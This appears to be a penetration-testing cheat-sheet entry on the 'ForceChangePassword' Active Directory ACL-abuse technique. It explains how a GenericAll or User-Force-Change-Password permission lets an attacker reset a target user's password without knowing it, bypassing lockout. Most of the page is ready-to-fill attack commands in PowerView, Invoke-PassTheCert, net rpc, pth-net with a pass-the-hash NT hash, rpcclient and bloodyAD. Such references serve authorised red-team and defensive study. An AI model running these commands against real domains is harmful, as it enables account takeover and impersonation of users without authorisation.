---
technique: ForceChangePassword
category: acl-abuse
ace: GenericAll, AllExtendedRights, User-Force-Change-Password
targets: User
protocols: SAMR, LDAP, LDAPS
remote_capable: true
tags: acl-abuse dacl ad password-reset samr ldap
---

# ForceChangePassword

When a controlled object holds a permissive ACE over a target user account, that ACE can be abused to forcibly reset the user's password without knowing the current one. The new password can then be used to authenticate as the target. This technique does not require knowledge of the current credential and bypasses lockout policies applied to normal password change flows.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| GenericAll | Full control of the object |
| AllExtendedRights | All extended rights, including User-Force-Change-Password |
| User-Force-Change-Password | The specific extended right to reset a user's password without knowing the current one |

## Windows

Native tools and PowerView can both force a password reset. Invoke-PassTheCert covers certificate-based auth scenarios.

### Step 1: Convert new password to SecureString (PowerView)

#powershell #powerview

Convert the desired new password to a SecureString object required by Set-DomainUserPassword.

```powershell title:"Convert new password to SecureString"
$new_password = ConvertTo-SecureString '$target_pass' -AsPlainText -Force
```
<!-- cheat
var target_pass
-->

### Step 2: Reset target user password (PowerView)

#powershell #powerview

Reset the target user's password using PowerView without requiring the current credential.

```powershell title:"Force password reset via PowerView"
Set-DomainUserPassword -Identity '$target_user' -AccountPassword $new_password
```
<!-- cheat
var target_user
var new_password
-->

### Step 3: Import module (Invoke-PassTheCert)

#powershell #certificate #ldaps

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 4: Get LDAP connection (Invoke-PassTheCert)

#powershell #certificate #ldaps

Establish an LDAPS connection using a certificate via Invoke-PassTheCert.

```powershell title:"Get LDAP connection instance via certificate"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 5: Reset password over LDAPS (Invoke-PassTheCert)

#powershell #certificate #ldaps

Reset a target user's password over LDAPS using a certificate via Invoke-PassTheCert.

```powershell title:"Force password reset over LDAPS using certificate"
Invoke-PassTheCert -Action 'UpdatePasswordOfIdentity' -LdapConnection $ldap -Identity "$target_user_dn" -NewPassword "$target_pass"
```
<!-- cheat
var target_user_dn
var target_pass
var ldap
-->

## Linux

All tools below reach the domain controller over SAMR or LDAP.

### net rpc

#samr #password

Reset a user's password via SAMR using the samba-client `net` tool.

```sh title:"Force password reset via SAMR"
net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
```
<!-- cheat
import domain_ip
import users
import passwords
var target_user
var target_pass
var rhost_name
-->

### pth-net

#samr #pth

Reset a user's password via SAMR using an NT hash instead of a plaintext password.

```sh title:"Force password reset via SAMR with NT hash"
pth-net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%"aad3b435b51404eeaad3b435b51404ee":"$nt_hash" -S "$rhost_name"
```
<!-- cheat
import domain_ip
import users
var target_user
var target_pass
var nt_hash
var rhost_name
-->

### rpcclient

#samr #password

Reset a user's password interactively via rpcclient when samba-common-bin is unavailable.

```sh title:"Force password reset via rpcclient setuserinfo2"
rpcclient -U "$domain"/"$user"%"$pass" "$rhost_name" -c "setuserinfo2 $target_user 23 $target_pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var target_user
var target_pass
var rhost_name
-->

### bloodyAD

#ldap #multi-auth

Reset a user's password using bloodyAD with selectable auth method.

```sh title:"Force password reset via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags set password "$target_user" "$target_pass"
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
var target_pass
-->
